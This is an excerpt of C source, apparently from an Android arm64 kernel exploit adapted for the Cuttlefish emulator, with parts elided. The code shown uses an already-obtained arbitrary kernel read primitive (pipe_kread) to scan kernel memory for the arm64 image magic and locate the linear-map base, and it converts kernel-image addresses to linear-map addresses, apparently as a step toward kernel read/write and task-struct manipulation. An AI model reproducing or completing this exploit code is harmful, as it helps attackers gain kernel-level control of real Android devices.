...
// linear base seems to be 0xffffff8000200000
// but scan just to be safe
u64 cuttlefish_kimg_to_lm(struct rw_info *rw, u64 kaddr) {
    return (kaddr - rw->ki.kernel_base) + LINEAR_BASE;
}
...
// MODIFIED: added controllable leak amount for task struct
...
// added for cuttlefish
u64 scan_linear_base(struct rw_info *rw) {
    u8 tmp_buf[0x40];
    for (u64 kaddr = 0xffffff8000000000; 
    kaddr <= 0xffffffc000000000UL; kaddr += 0x1000) 
    {
        pipe_kread(rw, kaddr, tmp_buf, 0x40);
        if (!memcmp(&tmp_buf[0x38], "ARMd", 4)) {
...
int get_stable_rw(struct rw_info *rw) {
    ...
    LINEAR_BASE = scan_linear_base(rw);
    LOGD("[x] Linear base: %016lx\n", LINEAR_BASE);
